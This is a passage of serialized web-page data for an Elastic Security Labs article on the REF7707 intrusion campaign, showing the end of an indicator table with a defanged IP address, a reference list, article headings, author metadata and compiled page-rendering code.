infrastructure\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"47.239.0[.]216\"})}),(0,i.jsx)(e.td,{children:\"ipv4-addr\"}),(0,i.jsx)(e.td,{}),(0,i.jsx)(e.td,{children:\"REF7707 infrastructure\"})]})]})]})}),`\n`,(0,i.jsx)(e.h2,{id:\"references\",children:\"References\"}),`\n`,(0,i.jsx)(e.p,{children:\"The following were referenced throughout the above research:\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/finaldraft\",rel:\"nofollow\",children:\"https://www.elastic.co/security-labs/finaldraft\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://mrd0x.com/the-power-of-cdb-debugging-tool/\",rel:\"nofollow\",children:\"https://mrd0x.com/the-power-of-cdb-debugging-tool/\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://web.archive.org/web/20210305190100/http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html\",rel:\"nofollow\",children:\"https://web.archive.org/web/20210305190100/http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html\"})}),`\n`]}),`\n`,(0,i.jsx)(e.h2,{id:\"about-elastic-security-labs\",children:\"About Elastic Security Labs\"}),`\n`,(0,i.jsx)(e.p,{children:\"Elastic Security Labs is dedicated to creating positive change in the threat landscape by  providing publicly available research on emerging threats.\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"Follow Elastic Security Labs on X \",(0,i.jsx)(e.a,{href:\"https://twitter.com/elasticseclabs?ref_src=twsrc%5Egoogle%7Ctwcamp%5Eserp%7Ctwgr%5Eauthor\",rel:\"nofollow\",children:\"@elasticseclabs\"}),\" and check out our research at \",(0,i.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/\",rel:\"nofollow\",children:\"www.elastic.co/security-labs/\"}),\". You can see the technology we leveraged for this research and more by checking out \",(0,i.jsx)(e.a,{href:\"https://www.elastic.co/security\",rel:\"nofollow\",children:\"Elastic Security\"}),\".\"]})]})}function A(n={}){let{wrapper:e}=n.components||{};return e?(0,i.jsx)(e,Object.assign({},n,{children:(0,i.jsx)(s,n)})):s(n)}var T=A;return v(F);})();\n;return Component;"},"_id":"articles/fragile-web-ref7707.mdx","_raw":{"sourceFilePath":"articles/fragile-web-ref7707.mdx","sourceFileName":"fragile-web-ref7707.mdx","sourceFileDir":"articles","contentType":"mdx","flattenedPath":"articles/fragile-web-ref7707"},"type":"Article","imageUrl":"/assets/images/fragile-web-ref7707/ref7707.jpg","readingTime":"28 min read","series":"","url":"/fragile-web-ref7707","headings":[{"level":2,"title":"REF7707 summarized","href":"#ref7707-summarized"},{"level":2,"title":"Key takeaways","href":"#key-takeaways"},{"level":2,"title":"Campaign Overview ","href":"#campaign-overview-"},{"level":3,"title":"Campaign layout (the diamond model)","href":"#campaign-layout-the-diamond-model"},{"level":2,"title":"Execution Flow","href":"#execution-flow"},{"level":3,"title":"Primary execution chain","href":"#primary-execution-chain"},{"level":4,"title":"WinrsHost.exe","href":"#winrshostexe"},{"level":4,"title":"FontDrvHost.exe","href":"#fontdrvhostexe"},{"level":3,"title":"Connectivity checks","href":"#connectivity-checks"},{"level":3,"title":"Reconnaissance / enumeration / credential harvesting","href":"#reconnaissance--enumeration--credential-harvesting"},{"level":3,"title":"Persistence","href":"#persistence"},{"level":3,"title":"FINALDRAFT Analysis","href":"#finaldraft-analysis"},{"level":4,"title":"PATHLOADER and GUIDLOADER","href":"#pathloader-and-guidloader"},{"level":4,"title":"FINALDRAFT bridging OS’","href":"#finaldraft-bridging-os"},{"level":2,"title":"Infrastructure Analysis","href":"#infrastructure-analysis"},{"level":3,"title":"Service banner hashes","href":"#service-banner-hashes"},{"level":4,"title":"Hobiter and VMphere","href":"#hobiter-and-vmphere"},{"level":4,"title":"ICTNSC","href":"#ictnsc"},{"level":4,"title":"Autodiscovar","href":"#autodiscovar"},{"level":4,"title":"D-links and VM-clouds","href":"#d-links-and-vm-clouds"},{"level":4,"title":"Fortineat","href":"#fortineat"},{"level":4,"title":"Checkponit","href":"#checkponit"},{"level":4,"title":"Third-party infrastructure","href":"#third-party-infrastructure"},{"level":2,"title":"REF7707 timeline","href":"#ref7707-timeline"},{"level":2,"title":"Conclusion","href":"#conclusion"},{"level":2,"title":"REF7707 through MITRE ATT\u0026CK","href":"#ref7707-through-mitre-attck"},{"level":2,"title":"Detecting REF7707","href":"#detecting-ref7707"},{"level":3,"title":"YARA","href":"#yara"},{"level":2,"title":"Observations","href":"#observations"},{"level":2,"title":"References","href":"#references"},{"level":2,"title":"About Elastic Security Labs","href":"#about-elastic-security-labs"}],"author":[{"title":"Andrew Pease","slug":"andrew-pease","description":"Elastic Security Labs Technical Lead","image":"andrew-pease.jpg","body":{"raw":"","code":"var Component=(()=\u003e{var m=Object.create;var s=Object.defineProperty;var p=Object.getOwnPropertyDescriptor;var x=Object.getOwnPropertyNames;var g=Object.getPrototypeOf,l=Object.prototype.hasOwnProperty;var f=(e,t)=\u003e()=\u003e(t||e((t={exports:{}}).exports,t),t.exports),j=(e,t)=\u003e{for(var n in t)s(e,n,{get:t[n],enumerable:!0})},c=(e,t,n,o)=\u003e{if(t\u0026\u0026typeof t==\"object\"||typeof t==\"function\")for(let a of x(t))!l.call(e,a)\u0026\u0026a!==n\u0026\u0026s(e,a,{get:()=\u003et[a],enumerable:!(o=p(t,a))||o.enumerable});return e};var _=(e,t,n)=\u003e(n=e!=null?m(g(e)):{},c(t||!e||!e.__esModule?s(n,\"default\",{value:e,enumerable:!0}):n,e)),w=e=\u003ec(s({},\"__esModule\",{value:!0}),e);var u=f((C,i)=\u003e{i.exports=_jsx_runtime});var h={};j(h,{default:()=\u003eb,frontmatter:()=\u003eL});var r=_(u()),L={title:\"Andrew Pease\",description:\"Elastic Security Labs Technical Lead\",slug:\"andrew-pease\",image:\"andrew-pease.jpg\"};function d(e){return(0,r.jsx)(r.Fragment,{})}function M(e={}){let{wrapper:t}=e.components||{};return t?(0,r.jsx)(t,Object.assign({},e,{children:(0,r.jsx)(d,e)})):d(e)}var b=M;return w(h);})();\n;return Component;"},"_id":"authors/andrew-pease.mdx","_raw":{"sourceFilePath":"authors/andrew-pease.mdx","sourceFileName":"andrew-pease.mdx","sourceFileDir":"authors","contentType":"mdx","flattenedPath":"authors/andrew-pease"},"type":"Author","imageUrl":"/assets/images/authors/andrew-pease.jpg","url":"/authors/andrew-pease"},{"title":"Seth Goodwin","slug":"seth-goodwin","description":"Elastic Security Labs Team Senior Research Engineer, Intelligence","body":{"raw":"","code":"var Component=(()=\u003e{var g=Object.create;var i=Object.defineProperty;var l=Object.getOwnPropertyDescriptor;var x=Object.getOwnPropertyNames;var d=Object.getPrototypeOf,f=Object.prototype.hasOwnProperty;var _=(t,e)=\u003e()=\u003e(e||t((e={exports:{}}).exports,e),e.exports),h=(t,e)=\u003e{for(var n in e)i(t,n,{get:e[n],enumerable:!0})},a=(t,e,n,s)=\u003e{if(e\u0026\u0026typeof e==\"object\"||typeof e==\"function\")for(let o of x(e))!f.call(t,o)\u0026\u0026o!==n\u0026\u0026i(t,o,{get:()=\u003ee[o],enumerable:!(s=l(e,o))||s.enumerable});return t};var j=(t,e,n)=\u003e(n=t!=null?g(d(t)):{},a(e||!t||!t.__esModule?i(n,\"default\",{value:t,enumerable:!0}):n,t)),p=t=\u003ea(i({},\"__esModule\",{value:!0}),t);var u=_((C,c)=\u003e{c.exports=_jsx_runtime});var b={};h(b,{default:()=\u003eS,frontmatter:()=\u003ew});var r=j(u()),w={title:\"Seth Goodwin\",description:\"Elastic Security Labs Team Senior Research Engineer, Intelligence\",slug:\"seth-goodwin\"};function m(t){return(0,r.jsx)(r.Fragment,{})}function M(t={}){let{wrapper:e}=t.components||{};return e?(0,r.jsx)(e,Object.assign({},t,{children:(0,r.jsx)(m,t)})):m(t)}var S=M;return p(b);})();\n;return Component;"},"_id":"authors/seth-goodwin.mdx","_raw":{"sourceFilePath":"authors/seth-goodwin.mdx","sourceFileName":"seth-goodwin.mdx","sourceFileDir":"authors","contentType":"mdx","flattenedPath":"authors/seth-goodwin"},"type":"Author","imageUrl":"","url":"/authors/seth-goodwin"}],"category":[{"title":"Campaigns","slug":"campaigns","body":{"raw":"","code":"var Component=(()=\u003e{var x=Object.create;var o=Object.defineProperty;var g=Object.getOwnPropertyDescriptor;var f=Object.getOwnPropertyNames;var p=Object.getPrototypeOf,_=Object.prototype.hasOwnProperty;var j=(t,n)=\u003e()=\u003e(n||t((n={exports:{}}).exports,n),n.exports),l=(t,n)=\u003e{for(var e in n)o(t,e,{get:n[e],enumerable:!0})},c=(t,n,e,s)=\u003e{if(n\u0026\u0026typeof n==\"object\"||typeof n==\"function\")for(let a of f(n))!_.call(t,a)\u0026\u0026a!==e\u0026\u0026o(t,a,{get:()=\u003en[a],enumerable:!(s=g(n,a))||s.enumerable});return t};var d=(t,n,e)=\u003e(e=t!=null?x(p(t)):{},c(n||!t||!t.__esModule?o(e,\"default\",{value:t,enumerable:!0}):e,t)),C=t=\u003ec(o({},\"__esModule\",{value:!0}),t);var m=j((h,i)=\u003e{i.exports=_jsx_runtime});var X={};l(X,{default:()=\u003eF,frontmatter:()=\u003eM});var r=d(m()),M={title:\"Campaigns\",slug:\"campaigns\"};function u(t){return(0,r.jsx)(r.Fragment,{})}function D(t={}){let{wrapper:n}=t.components||{};return n?(0,r.jsx)(n,Object.assign({},t,{children:(0,r.jsx)(u,t)})):u(t)}var F=D;return C(X);})();\n;return Component;"},"_id":"categories/campaigns.mdx","_raw":{"sourceFilePath":"categories/campaigns.mdx","sourceFileName":"campaigns.mdx","sourceFileDir":"categories","contentType":"mdx","flattenedPath":"categories/campaigns"},"type":"Category","url":"/categories/campaigns"}]},"seriesArticles":null},"__N_SSG":true},"page":"/[slug]","query":{"slug":"fragile-web-ref7707"},"buildId":"4Kiz4W6h6K4GvjoQBSLKb","assetPrefix":"/security-labs","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>